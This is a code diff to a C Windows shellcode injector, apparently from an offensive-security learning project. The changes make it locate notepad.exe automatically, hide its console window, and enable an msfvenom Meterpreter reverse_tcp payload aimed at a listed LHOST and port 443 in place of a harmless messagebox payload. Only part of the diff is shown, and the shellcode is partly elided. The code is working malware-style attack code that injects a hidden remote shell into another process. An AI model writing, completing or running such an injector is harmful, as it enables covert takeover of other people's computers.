@@ -1,19 +1,52 @@
 #include <windows.h>
 #include <stdio.h>
+#include <tlhelp32.h>
+
+#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
 const char* k = "[+]";
 const char* i = "[*]";
 const char* e = "[-]";
 
-int main(int argc, char* argv[]) {
+DWORD GetPidByName(LPCWSTR processName) {
+	DWORD pid = 0;
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+	PROCESSENTRY32W pe;
+	pe.dwSize = sizeof(pe);
+
+	if (Process32FirstW(hSnapshot, &pe)) {
+		do {
+			if (lstrcmpiW(processName, pe.szExeFile) == 0) {
+				pid = pe.th32ProcessID;
+				break;
+			}
+		} while (Process32NextW(hSnapshot, &pe));
+	}
+
+	CloseHandle(hSnapshot);
+	return pid;
+}
+
+int main() {
 
 	DWORD PID, TID = NULL; //dword = unsigned long
 	LPVOID rBuffer = NULL;
 	HANDLE hProcess = NULL, hThread = NULL;
+	PID = GetPidByName(L"notepad.exe");
+
+	if (PID == NULL) {
+		printf("%s failed to get PID, error: %ld", e, GetLastError());
+		return EXIT_FAILURE;
+	}
+	
+	printf("%s PID for notepad is (%l)\n", i, PID);
+
 
 	//msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.22.249 LPORT=443 EXITFUNC=thread -f c --var-name=something
 
-	/*unsigned char something[] =
+	unsigned char something[] =
 		"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
 		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
 		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
@@ -50,10 +83,10 @@ int main(int argc, char* argv[]) {
 		"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
 		"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
 		"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d"
-		"\x2a\x0a\x41\x89\xda\xff\xd5";*/
+		"\x2a\x0a\x41\x89\xda\xff\xd5";
 
 	//msfvenom -p windows/x64/messagebox ICON=WARNING TEXT="Hello! " TITLE="Injected" EXITFUNC=thread -f c --var-name=something
-	unsigned char something[] =
+	/*unsigned char something[] =
 		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
 		"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
 		"\x48\x8b\x52\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72"
@@ -77,19 +110,9 @@ int main(int argc, char* argv[]) {
 		"\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff\xd5\xbb\xe0\x1d"
 		"\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28"
 		"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f"
-		"\x6a\x00\x59\x41\x89\xda\xff\xd5";
-
-	
+		"\x6a\x00\x59\x41\x89\xda\xff\xd5";*/
 
 
-
-	if (argc < 2) {
-		printf("%s usage: program.exe <PID>", e);
-		return EXIT_FAILURE;
-
-	}
-
-	PID = atoi(argv[1]);
 	printf("%s trying to open a handle to process (%l)\n", i, PID);
 
 	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
